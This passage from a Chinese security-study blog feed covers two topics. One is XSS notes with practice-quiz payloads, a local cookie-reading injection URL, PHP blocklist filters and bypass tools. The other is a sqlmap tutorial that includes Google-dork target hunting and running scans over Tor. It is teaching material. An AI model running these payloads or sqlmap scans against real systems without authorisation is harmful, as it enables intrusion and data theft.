class="string">"&lt;"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>stage #16</p><p><a href="https://xss-quiz.int21h.jp/stage00000016.php?sid=5286887e32a1526dc007701ca9e159eed22b992e" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage00000016.php?sid=5286887e32a1526dc007701ca9e159eed22b992e</a></p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\u003cscript\\u003ealert(<span class="built_in">document</span>.domain);\\u003c/script\\u003e</span><br></pre></td></tr></table></figure><h2 id="源"><a href="#源" class="headerlink" title="源"></a>源</h2><p>源：由协议，主机名，端口名组成（例：协议://主机名:端口号/）</p><p>同源策略（SOP）：用于阻止一个非同源的页面恶意代码去访问另外一个非同源页面</p><h3 id="ie的特殊处理"><a href="#ie的特殊处理" class="headerlink" title="ie的特殊处理"></a>ie的特殊处理</h3><p>1.位于可信域的互信的域名间，不受同源策略限制</p><p>2.ie在判断同源时不考虑端口</p><h3 id="document-domain"><a href="#document-domain" class="headerlink" title="document.domain"></a>document.domain</h3><p>可通过document.domain读取或修改源；但有限制，修改之后的源不能通过其他脚本再次修改。</p><p>domain属性可以解决因同源安全策略带来的不同文档的属性共享问题</p><p>降域 document.domain,同源策略认为域和子域属于不同的域，如child.a.com 与 a.ocm,child2.a.com与child1.a.com,两两不同源，可设置document.domain=”a.com”,就同源了；想要设置以上任意两个页面通信 ，两个页面都必须设置document.domain=”a.com”。</p><h2 id="cookie的httponly设置"><a href="#cookie的httponly设置" class="headerlink" title="cookie的httponly设置"></a>cookie的httponly设置</h2><p>消除cookie：Internet选项，常规</p><h3 id="cookie-httponly"><a href="#cookie-httponly" class="headerlink" title="cookie httponly"></a>cookie httponly</h3><p>setcookie(“abc”,”test”,NULL,NULL,NULL,NULL,TRUE);设置secure参数为true之后，就不能使用js获取cookie</p><p>setcookie(<code>name</code>(必须。规定名称),<code>value</code>(必须，规定值),<code>expire</code>(有效期),<code>path</code>(服务器路径),<code>domain</code>( 域名),<code>secure</code>(是否通过安全的https连接来传输cookie),<code>httponly</code>)</p><p>在本地实验：</p><p><code>tescookie.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    setcookie(<span class="string">"user"</span>,<span class="string">"admin"</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">FALSE</span>);</span><br><span class="line">    setcookie(<span class="string">"pass"</span>,<span class="string">"admin"</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">TRUE</span>);</span><br><span class="line">    $id = $_GET[<span class="string">"id"</span>];</span><br><span class="line">    <span class="keyword">echo</span> $id;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;testcookie.php?id&#x3D;%3Cscript%3Edocument.write(document.cookie);%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure><p>就会输出 user=admin，TRUE的pass就不会输出。</p><h2 id="xss-filter-过滤器"><a href="#xss-filter-过滤器" class="headerlink" title="xss-filter 过滤器"></a>xss-filter 过滤器</h2><h3 id="防御函数"><a href="#防御函数" class="headerlink" title="防御函数"></a>防御函数</h3><p><strong><a href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp" target="_blank" rel="noopener">htmlspecialchars()函数</a></strong></p><p>把预定义的字符转换为html实体</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars(string,flags,character-set,double_encode)</span><br></pre></td></tr></table></figure><p><strong><a href="https://www.w3school.com.cn/php/func_string_htmlentities.asp" target="_blank" rel="noopener">htmlentities()函数</a></strong></p><p> 过滤用户输入的数据，将一些特殊字符串转换为html实体。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlentities(string,flags,character-set,double_encode)</span><br></pre></td></tr></table></figure><p><strong><a href="https://www.w3school.com.cn/php/func_string_strip_tags.asp" target="_blank" rel="noopener">strip_tags()函数</a></strong></p><p>剥去字符串中得html、xml以及php的标签。</p><blockquote><p>该函数会剥离html注释，这点无法通过allow参数改变。</p><p>该函数是二进制安全的。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strip_tags(string,allow)</span><br></pre></td></tr></table></figure><p><strong>自定义xss filter</strong></p><blockquote><p>法一</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss_clean</span><span class="params">($data)</span></span>&#123;</span><br><span class="line"> <span class="comment">// Fix &amp;entity＼n;</span></span><br><span class="line"> $data=str_replace(<span class="keyword">array</span>(<span class="string">'&amp;'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>),<span class="keyword">array</span>(<span class="string">'&amp;amp;'</span>,<span class="string">'&amp;lt;'</span>,<span class="string">'&amp;gt;'</span>),$data);</span><br><span class="line"> $data=preg_replace(<span class="string">'/(&amp;#*＼w+)[＼x00-＼x20]+;/u'</span>,<span class="string">'$1;'</span>,$data);</span><br><span class="line"> $data=preg_replace(<span class="string">'/(&amp;#x*[0-9A-F]+);*/iu'</span>,<span class="string">'$1;'</span>,$data);</span><br><span class="line"> $data=html_entity_decode($data,ENT_COMPAT,<span class="string">'UTF-8'</span>);</span><br><span class="line"> <span class="comment">// Remove any attribute starting with "on" or xmlns</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#(&lt;[^&gt;]+?[＼x00-＼x20"＼'</span>])(?:on|xmlns)[^&gt;]*+&gt;<span class="comment">#iu','$1&gt;',$data);</span></span><br><span class="line"> <span class="comment">// Remove javascript: and vbscript: protocols</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#([a-z]*)[＼x00-＼x20]*=[＼x00-＼x20]*([`＼'</span><span class="string">"]*)[＼x00-＼x20]*j[＼x00-＼x20]*a[＼x00-＼x20]*v[＼x00-＼x20]*a[＼x00-＼x20]*s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:#iu','$1=$2nojavascript...',$data);</span></span><br><span class="line"><span class="string"> $data=preg_replace('#([a-z]*)[＼x00-＼x20]*=([＼'"</span>]*)[＼x00-＼x20]*v[＼x00-＼x20]*b[＼x00-＼x20]*s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:<span class="comment">#iu','$1=$2novbscript...',$data);</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#([a-z]*)[＼x00-＼x20]*=([＼'</span><span class="string">"]*)[＼x00-＼x20]*-moz-binding[＼x00-＼x20]*:#u','$1=$2nomozbinding...',$data);</span></span><br><span class="line"><span class="string"> // Only works in IE: &lt;span style="</span>width: expression(alert(<span class="string">'Ping!'</span>));<span class="string">"&gt;&lt;/span&gt;</span></span><br><span class="line"><span class="string"> $data=preg_replace('#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'"</span>]*.*?expression[＼x00-＼x20]*＼([^&gt;]*+&gt;<span class="comment">#i','$1&gt;',$data);</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'</span><span class="string">"]*.*?behaviour[＼x00-＼x20]*＼([^&gt;]*+&gt;#i','$1&gt;',$data);</span></span><br><span class="line"><span class="string"> $data=preg_replace('#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'"</span>]*.*?s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:*[^&gt;]*+&gt;<span class="comment">#iu','$1&gt;',$data);</span></span><br><span class="line"> <span class="comment">// Remove namespaced elements (we do not need them)</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#&lt;/*＼w+:＼w[^&gt;]*+&gt;#i'</span>,<span class="string">''</span>,$data);</span><br><span class="line"> <span class="keyword">do</span>&#123;<span class="comment">// Remove really unwanted tags</span></span><br><span class="line"> $old_data=$data;</span><br><span class="line"> $data=preg_replace(<span class="string">'#&lt;/*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^&gt;]*+&gt;#i'</span>,<span class="string">''</span>,$data);</span><br><span class="line"> &#125;<span class="keyword">while</span>($old_data!==$data);</span><br><span class="line"> <span class="comment">// we are done...</span></span><br><span class="line"> <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>法二</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//php防注入和XSS攻击通用过滤.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//by qq:831937</span></span><br><span class="line"></span><br><span class="line">$_GET    &amp;&amp; SafeFilter($_GET);</span><br><span class="line">$_POST   &amp;&amp; SafeFilter($_POST);</span><br><span class="line">$_COOKIE &amp;&amp; SafeFilter($_COOKIE);</span><br><span class="line">functionSafeFilter (&amp;$arr)</span><br><span class="line">&#123; </span><br><span class="line">   $ra=<span class="keyword">Array</span>(<span class="string">'/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/'</span>,<span class="string">'/script/'</span>,<span class="string">'/javascript/'</span>,<span class="string">'/vbscript/'</span>,<span class="string">'/expression/'</span>,<span class="string">'/applet/'</span>,<span class="string">'/meta/'</span>,<span class="string">'/xml/'</span>,<span class="string">'/blink/'</span>,<span class="string">'/link/'</span>,<span class="string">'/style/'</span>,<span class="string">'/embed/'</span>,<span class="string">'/object/'</span>,<span class="string">'/frame/'</span>,<span class="string">'/layer/'</span>,<span class="string">'/title/'</span>,<span class="string">'/bgsound/'</span>,<span class="string">'/base/'</span>,<span class="string">'/onload/'</span>,<span class="string">'/onunload/'</span>,<span class="string">'/onchange/'</span>,<span class="string">'/onsubmit/'</span>,<span class="string">'/onreset/'</span>,<span class="string">'/onselect/'</span>,<span class="string">'/onblur/'</span>,<span class="string">'/onfocus/'</span>,<span class="string">'/onabort/'</span>,<span class="string">'/onkeydown/'</span>,<span class="string">'/onkeypress/'</span>,<span class="string">'/onkeyup/'</span>,<span class="string">'/onclick/'</span>,<span class="string">'/ondblclick/'</span>,<span class="string">'/onmousedown/'</span>,<span class="string">'/onmousemove/'</span>,<span class="string">'/onmouseout/'</span>,<span class="string">'/onmouseover/'</span>,<span class="string">'/onmouseup/'</span>,<span class="string">'/onunload/'</span>);</span><br><span class="line">   <span class="keyword">if</span>(is_array($arr))</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">foreach</span>($arras</span><br><span class="line">$key  =&gt; $value)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_array($value))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span>(!get_magic_quotes_gpc())             <span class="comment">//不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。</span></span><br><span class="line">          &#123;</span><br><span class="line">             $value = addslashes($value);          <span class="comment">//给单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符）加上反斜线转义</span></span><br><span class="line">          &#125;</span><br><span class="line">          $value      = preg_replace($ra,<span class="string">''</span>,$value);    <span class="comment">//删除非打印字符，粗暴式过滤xss可疑字符串</span></span><br><span class="line">          $arr[$key]     = htmlentities(strip_tags($value));<span class="comment">//去除 HTML 和 PHP 标记并转换为 HTML 实体</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          SafeFilter($arr[$key]);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="编码转义"><a href="#编码转义" class="headerlink" title="编码转义"></a>编码转义</h2><h3 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h3><p>将不安全的字符编码为安全字符在进行传输（通用得安全字母表）</p><p>%+两个表示字符ascii的16进制数</p><h3 id="html编码"><a href="#html编码" class="headerlink" title="html编码"></a>html编码</h3><p>一些保留字符出现在文本节点和标签值里不安全，如“&lt;&gt;”会导致刘安琪误以为标签</p><p>实体编码</p><p>一般&amp;开头，“;”结尾，可不加“；”。如”&lt;”转为”&lt;”</p><p>进制编码</p><p>以&amp;#开头，加上字符的数值，”;”结尾可不加。字符数值可以是任意十进制ASCII码或Unicode字符编码，十六进制的数值需要在编码数字前加”x“ .</p><h3 id="js编码"><a href="#js编码" class="headerlink" title="js编码"></a>js编码</h3><p>\u +00 + ASCII码</p><p>\x + ASCII码</p><p><a href="http://utf-8.jp/public/jsfuck.html" target="_blank" rel="noopener">jsfuck</a></p><h3 id="编码含义"><a href="#编码含义" class="headerlink" title="编码含义"></a>编码含义</h3><p>攻击绕过</p><h2 id="xss过滤器绕过"><a href="#xss过滤器绕过" class="headerlink" title="xss过滤器绕过"></a>xss过滤器绕过</h2><p>xss payload测试</p><p>kali路径：/usr/share/wordlists/wfuzz/Injections/xss.txt</p><p>自动化探测，burp:Intruder模块，在positions设置注入位置；在payload中设置payload type为runtime file然后选择对应的xss payload，之后start attack。</p><p><strong>关注最新的html等内容</strong></p><p>例如更新了新标签，可进行xss测试</p><p>参考 ：owasp.org</p><h2 id="xss发生的位置"><a href="#xss发生的位置" class="headerlink" title="xss发生的位置"></a>xss发生的位置</h2><h3 id="get型url中的xss"><a href="#get型url中的xss" class="headerlink" title="get型url中的xss"></a>get型url中的xss</h3><p>如果url修改提交的参数值,在页面显示，很有可能存在(反射)xss</p><h3 id="post表单中的xss"><a href="#post表单中的xss" class="headerlink" title="post表单中的xss"></a>post表单中的xss</h3><p>在表单中的提交修改的参数值，在页面中显示，很有可能存在xss</p><p>form data</p><h3 id="json中的xss"><a href="#json中的xss" class="headerlink" title="json中的xss"></a>json中的xss</h3><p>json(javascript object notation)是一种轻量级的数据交换格式，易于人阅读和编写，同时也易于机器解析和生成，并有效的提升网络传输效率</p><p>json 最常见的格式是对象的键值对</p><p>闭合前面+;alert(“xss”);//注释后面</p><h3 id="自定义http头中的xss"><a href="#自定义http头中的xss" class="headerlink" title="自定义http头中的xss"></a>自定义http头中的xss</h3><p>如果在http自定义头中提交的参数值，在页面中显示。很有可能存在xss</p><h2 id="存储型xss灰盒测试"><a href="#存储型xss灰盒测试" class="headerlink" title="存储型xss灰盒测试"></a>存储型xss灰盒测试</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>PHPstuday:搭建微程序，rocboss</p><p>定向xss挖掘:探测漏洞位置，能存储的地方</p><p>黑名单审计：查看filter，绕过黑名单</p><p>绕过过滤，触发xss：绕过并针对漏洞攻击</p><h2 id="自动挖掘工具"><a href="#自动挖掘工具" class="headerlink" title="自动挖掘工具"></a>自动挖掘工具</h2><p>xsser介绍：针对web应用程序自动化挖掘，利用，报告xss漏洞的框架</p><p>原理：不断拼接payload</p><p>帮助信息： xsser -h</p><p>启动方式： 图像化 xsser- gtk</p><p><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">xsstrike</a></p><blockquote><p>stage #17</p><p><a href="https://xss-quiz.int21h.jp/stage-No17.php?sid=4f0dacf93ef764da56fd687692abc63e1a31e095" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage-No17.php?sid=4f0dacf93ef764da56fd687692abc63e1a31e095</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap详细使用教程</title>
      <link href="/categories/%E5%B7%A5%E5%85%B7/sqlmap%E8%AF%A6%E7%BB%86%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/categories/%E5%B7%A5%E5%85%B7/sqlmap%E8%AF%A6%E7%BB%86%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>sqlmap： 开源的渗透测工具</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>sqlmap 是开源的渗透测试工具，自动化检测sql注入漏洞，利用其漏洞获取数据库服务器的权限。它的检测引擎功能强大，对于不同类型的数据库的渗透测试，拥有不同的功能选项；既可以获取数据库中存储的数据，又可以访问操作系统文件，甚至可以通过外带数据连接的方式执行操作系统命令。</p><h3 id="安装与环境配置"><a href="#安装与环境配置" class="headerlink" title="安装与环境配置"></a>安装与环境配置</h3><p><a href="https://www.python.org/download/releases/2.7/" target="_blank" rel="noopener">sqlmap官网</a></p><p>下载python2.7，安装完成后，配置环境：</p><p>path内添加python安装路径，例如 D:\python</p><p><a href="https://www.cnblogs.com/huangbiquan/p/7784533.html" target="_blank" rel="noopener">环境配置教学</a></p><h2 id="输出详细程度"><a href="#输出详细程度" class="headerlink" title="输出详细程度"></a>输出详细程度</h2><p>共7级，0到6，默认为1级</p><ul><li>0： 仅显示Python追溯，错误和严重消息 </li><li>1： 还显示信息和警告消息 </li><li>2： 还显示调试消息 </li><li>3： 查看工具发送的SQL有效负载 </li></ul><h2 id="确定探测目标"><a href="#确定探测目标" class="headerlink" title="确定探测目标"></a>确定探测目标</h2><h3 id="直连数据库"><a href="#直连数据库" class="headerlink" title="直连数据库"></a>直连数据库</h3><p><code>-d</code></p><p>数据库类型：文件型数据库（前提是知道数据库绝对路径），关系型数据库（前提是知道数据库用户名和密码）</p><p>连接关系型数据库 操作</p><blockquote><p>sqlmap -d “DBMS://User:Password@DBMS_Ip:DBMS_Port/DB_Name”  -f –banner -users</p><p>-d 表示直连  DBMS有mysql,oracle,microsofe sql server,psql,etc…</p><p>-f fetch 返回</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -d "mysql://root:123456@192.168.1.123:3306/test" -f --banner --users</span><br></pre></td></tr></table></figure><p>连接文件型数据库 操作</p><blockquote><p>同上，DBMS的种类有SQLite,microsofe Access,Firebird,etc…</p><p>sqlmap -d “DBMS://db_filepath”</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -d "DBMS://db_filepath"</span><br></pre></td></tr></table></figure><h3 id="指定URL"><a href="#指定URL" class="headerlink" title="指定URL"></a>指定URL</h3><p><code>-u</code></p><blockquote><p> sqlmap -u “<a href="http://targeturl[:port]/[目标文件文件夹]&quot;">http://targeturl[:port]/[目标文件文件夹]&quot;</a></p><p>-u/–url 连接url</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://www.target.com/index.php?id=1" --banner</span><br></pre></td></tr></table></figure><h3 id="不同类型文件中读取目标"><a href="#不同类型文件中读取目标" class="headerlink" title="不同类型文件中读取目标"></a>不同类型文件中读取目标</h3><p><code>-l</code>    从burpsuit proxy或web Scarab proxy中读取Http请求的日志文件</p><p><code>-x</code>    从sitemap.xml站点地图文件中读取目标探测</p><p><code>-m</code>    从多行文本格式文件中读取多个目标，对多个目标进行探测</p><p><code>-r</code>    从文本文件中读取Http请求作为sql注入探测的目标</p><p><code>-c</code>    从配置文件sqlmap.conf 中读取目标探测</p><h3 id="google批量扫注入"><a href="#google批量扫注入" class="headerlink" title="google批量扫注入"></a>google批量扫注入</h3><p><code>-g</code></p><p>sqlmap通过-g自动利用Google hack的目标，然后利用交互向导模式进行sqlmap注入探测</p><blockquote><p>python sqlmap.py -g “inurl:&quot;.php?id=1&quot;“</p><p>Google hacking语法</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -g "inurl:.php?id="</span><br></pre></td></tr></table></figure><h2 id="请求参数设置"><a href="#请求参数设置" class="headerlink" title="请求参数设置"></a>请求参数设置</h2><h3 id="设置http请求方法"><a href="#设置http请求方法" class="headerlink" title="设置http请求方法"></a>设置http请求方法</h3><p><code>--method</code>=PUT</p><blockquote><p>默认为get    </p></blockquote><h3 id="设置post参数"><a href="#设置post参数" class="headerlink" title="设置post参数"></a>设置post参数</h3><p><code>--data</code></p><p>默认HTTP请求方法为get,但可以隐式的改为post(方法为提供post要发送的数据)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://www.target.php?id=1" --data="uname=adnin" -f --dbs --banner --users</span><br></pre></td></tr></table></figure><blockquote><p>-f （fingerprint）指纹</p><p>–data=”uname=admin”    post 发送的数据</p></blockquote><h3 id="设置参数分隔符"><a href="#设置参数分隔符" class="headerlink" title="设置参数分隔符"></a>设置参数分隔符</h3><p><code>--param-del</code>  指定分隔符</p><blockquote><p>默认为“&amp;”做分隔符</p></blockquote><p>在某些情况下，sqlmap需要覆盖默认参数分隔符（例如&amp; in Get和Post数据），才能正确地分割和单独处理每个参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "www.target.com/culnds.php" --data="query=foobar;id=1" --param-del=";" --banner</span><br></pre></td></tr></table></figure><blockquote><p>–param-del=”;”，特殊情况下(其中提交的数据是以“；”号做为分割符，sqlmap 无法识别正误)，指定参数分割，sqlmap才能判断。</p></blockquote><h3 id="设置cookie参数"><a href="#设置cookie参数" class="headerlink" title="设置cookie参数"></a>设置cookie参数</h3><p><strong>使用场景</strong></p><p>web应用程序有基于cookie验证的过程</p><p>利用cookie值上的sql注入漏洞</p><p><strong>过程</strong></p><p>登录/浏览页面（无法登录是无法获取正确cookie值的）</p><p>审计工具/代理工具截断，复制cookie</p><p>在使用sqlmap</p><blockquote><p>注：对HTTP cookie值进行sql注入探测，需要设置 –level 2以上</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r target.txt --level 2 -p uname</span><br></pre></td></tr></table></figure></blockquote><p><code>--cookie</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://192.168.127.137/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit" --cookie "security=impossible; PHPSESSID=jeadfeijr3rc9sv6fcaib8" --banner</span><br></pre></td></tr></table></figure><blockquote><p>如果服务器端响应新的cookie值，此时sqlmap 会询问你将要使用哪组cookie</p></blockquote><p><code>--drop-set-cookie</code> </p><p>忽略任何即将到来的set-cookie头,仍然使用我们自己设置的cookie值，丢弃服务端响应的cookie值</p><p><code>--load-cookies</code> </p><p>可以用来加载一些 Netscape/wget格式的特殊文件的cookie</p><p><code>--cookie-del</code> 进行分割的参数</p><h3 id="设置user-agent头"><a href="#设置user-agent头" class="headerlink" title="设置user-agent头"></a>设置user-agent头</h3><blockquote><p>默认情况下，sqlmap使用用户代理头，执行HTTP请求：sqlmap/1.0-dev-xxxxxx(<a href="http://sqlmap.org" target="_blank" rel="noopener">http://sqlmap.org</a>)</p><p>一些站点在服务端检测HTTP user-agent值，如果不是一个合法的值，就会中断连接，同时sqlmap也会报出错误</p></blockquote><p><code>--user-agent</code> 用来伪造（自定义）用户代理</p><p><code>--random-agent</code> 会在<code>./txt/user-agent</code>中随机选择一个用于会话中的所有Http请求(usr/share/sqlmap/txt/user-agents.txt)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "..." --random-agent --banner</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "..." --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --banner</span><br></pre></td></tr></table></figure><blockquote><p>注： 对user-agent值（*）探测sql注入，需要设置–level 3</p></blockquote><h3 id="设置host头"><a href="#设置host头" class="headerlink" title="设置host头"></a>设置host头</h3><p>可以手动设置HTTP主机头值，默认情况下，从目标url解析http主机头</p><blockquote><p>注： 对HTTP主机头进行host注入检测，设置level 5</p><p>如果在http头内的host,标了“*”，则可不设置level 5</p></blockquote><h3 id="设置referer头"><a href="#设置referer头" class="headerlink" title="设置referer头"></a>设置referer头</h3><p>伪造http referer 值是可能的，默认情况下，如果没有显式设置，http请求中不会发送http引用头</p><blockquote><p>对于http引用头sql注入测试，应甚至level 3</p></blockquote><h3 id="设置额外的http头"><a href="#设置额外的http头" class="headerlink" title="设置额外的http头"></a>设置额外的http头</h3><p><code>--header</code></p><p><code>--headers</code></p><p>提供额外的 http 标头，每个标头必须要用换行符分隔，在sqlmap.conf 配置文件中设置更方便</p><p>“\n”作为–headers的分隔符</p><h3 id="设置http协议认证"><a href="#设置http协议认证" class="headerlink" title="设置http协议认证"></a>设置http协议认证</h3><p><code>--auth-type</code></p><p>支持Basic,Digest,NTLM</p><p><code>--auth-cred</code></p><p>认证语法为： username：password</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmapd -u "http://url/arit.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"</span><br></pre></td></tr></table></figure><h3 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h3><p><code>--proxy</code>  设置http代理服务器位置,格式：http(s)://ip[:port]</p><p><code>--proxy-cred</code>  设置http代理服务器认证信息，格式：–proxy-cred username:password</p><p><code>--proxy-file</code> 设置多条代理在文本中，可进行替换，快速完成切换</p><p><code>--ignore-proxy</code> 忽略系统设置的代理服务器</p><h3 id="设置tor隐藏网络"><a href="#设置tor隐藏网络" class="headerlink" title="设置tor隐藏网络"></a>设置tor隐藏网络</h3><p>–tor</p><p>–tor-port </p><p>–tor-type </p><p>–check-tor 检查tor是否可用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install tor #如果没有，需要安装</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service tor start</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "..." -tor --tor-type https --check-tor</span><br></pre></td></tr></table></figure><h3 id="设置延迟"><a href="#设置延迟" class="headerlink" title="设置延迟"></a>设置延迟</h3><p>某些服务器，会在你发包过快发出预警，或中断；默认是不设置延迟的。</p><p>–delay 0.5 设置延迟0.5秒</p><h3 id="设置超时"><a href="#设置超时" class="headerlink" title="设置超时"></a>设置超时</h3><p>指定等待的秒数，默认是30秒</p><p>–timeout 10.5  10秒半</p><h3 id="设置重试次数"><a href="#设置重试次数" class="headerlink" title="设置重试次数"></a>设置重试次数</h3><p>默认重试3次</p><p>–retries 4</p><h3 id="设置随机化参数"><a href="#设置随机化参数" class="headerlink" title="设置随机化参数"></a>设置随机化参数</h3><p>随即更改参数名称所对应的值，（sqlmap默认随机）</p><p>–randomize 参数名称（特定）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "...?id=1" --randomize id 